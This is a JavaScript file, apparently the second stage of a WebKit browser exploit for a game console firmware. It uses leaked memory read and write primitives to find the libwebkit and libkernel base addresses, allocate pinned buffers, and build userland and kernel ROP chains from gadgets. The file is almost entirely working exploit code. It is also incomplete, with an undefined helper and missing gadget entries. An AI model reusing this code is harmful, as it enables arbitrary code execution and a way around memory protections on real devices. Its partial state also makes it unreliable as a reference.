
var exploit = function() {
  p=window.primitives;

    print ("[+] exploit succeeded");
    print("webkit exploit result: " + p.leakval(0x41414141));
    print ("--- welcome to stage2 ---");
    
    p.leakfunc = function(func)
    {
        var fptr_store = p.leakval(func);
        return (p.read8(fptr_store.add32(0x18))).add32(0x40);
    } 
    var parseFloatStore = p.leakfunc(parseFloat);
    var parseFloatPtr = p.read8(parseFloatStore);
    print("parseFloat at: 0x" + parseFloatPtr);
    
    var webKitBase = p.read8(parseFloatStore);
    window.webKitBase = webKitBase;
    webKitBase.low &= 0xfffff000;
    webKitBase.sub32inplace(0x5b7000-0x1C000);
    
    window.moduleBaseWebKit = webKitBase;

    print("libwebkit base at: 0x" + webKitBase);
     
var gadget = function(o)
    {
        return webKitBase.add32(o);
    }
        gadgets = {"stack_chk_fail": gadget(0x000000c8),

    };  

    var libKernelBase = p.read8(deref_stub_jmp(gadgets.stack_chk_fail));
    window.libKernelBase = libKernelBase;
    libKernelBase.low &= 0xfffff000;
    libKernelBase.sub32inplace(0x12000);
    
    window.moduleBaseLibKernel = libKernelBase;
    
    print("libkernel_web base at: 0x" + libKernelBase);
       
// Basic memory functions
function malloc(size)
{
  var backing = new Uint8Array(0x10000 + size);

  window.nogc.push(backing);

  var ptr     = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = backing;

  return ptr;
}

function mallocu32(size) {
  var backing = new Uint8Array(0x10000 + size * 4);

  window.nogc.push(backing);

  var ptr     = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = new Uint32Array(backing.buffer);

  return ptr;
}

function stringify(str)
{
  var bufView = new Uint8Array(str.length + 1);

  for(var i=0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
  }

  window.nogc.push(bufView);
  return p.read8(p.leakval(bufView).add32(0x10));
}

// Class for quickly creating a kernel ROP chain
var krop = function (p, addr) {
  // Contains base and stack pointer for fake stack (this.stackBase = RBP, this.stackPointer = RSP)
  this.stackBase    = addr;
  this.stackPointer = 0;

  // Push instruction / value onto fake stack
  this.push = function (val) {
    p.write8(this.stackBase.add32(this.stackPointer), val);
    this.stackPointer += 8;
  };

  // Write to address with value (helper function)
  this.write64 = function (addr, val) {
    this.push(window.gadgets["pop rdi"]);
    this.push(addr);
    this.push(window.gadgets["pop rax"]);
    this.push(val);
    this.push(window.gadgets["mov [rdi], rax"]);
  }

  // Return krop object
  return this;
};

// Class for quickly creating and managing a ROP chain
window.rop = function() {
  this.stack        = new Uint32Array(0x10000);
  this.stackBase    = p.read8(p.leakval(this.stack).add32(0x10));
  this.count        = 0;

  this.clear = function() {
    this.count   = 0;
    this.runtime = undefined;

    for(var i = 0; i < 0xFF0 / 2; i++)
    {
      p.write8(this.stackBase.add32(i*8), 0);
    }
  };

  this.pushSymbolic = function() {
    this.count++;
    return this.count-1;
  }

  this.finalizeSymbolic = function(idx, val) {
    p.write8(this.stackBase.add32(idx * 8), val);
  }

  this.push = function(val) {
    this.finalizeSymbolic(this.pushSymbolic(), val);
  }

  this.push_write8 = function(where, what)
  {
      this.push(gadgets["pop rdi"]); // pop rdi
      this.push(where); // where
      this.push(gadgets["pop rsi"]); // pop rsi
      this.push(what); // what
      this.push(gadgets["mov [rdi], rsi"]); // perform write
  }

  this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9)
  {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]); // pop rdi
      this.push(rdi); // what
    }
    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]); // pop rsi
      this.push(rsi); // what
    }
    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]); // pop rdx
      this.push(rdx); // what
    }
    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]); // pop r10
      this.push(rcx); // what
    }
    if (r8 != undefined) {
      this.push(gadgets["pop r8"]); // pop r8
      this.push(r8); // what
    }
    if (r9 != undefined) {
      this.push(gadgets["pop r9"]); // pop r9
      this.push(r9); // what*/
    }

    this.push(rip); // jmp
    return this;
  }
  
  this.run = function() {
      var retv = p.loadchain(this, this.notimes);
      this.clear();
      return retv;
  }
  
  return this;
};
   
 
    log("--- welcome to all stage ---");
    print("stage2");
    print("loaded gadgets.all good. gadgets test = Successful");        
    log("stage3");
    print("loaded syscalls.all good. fcall test = Successful");  
    print("all stages test");
    print("NOT FULL Exploit 5.5x");
    
}

   
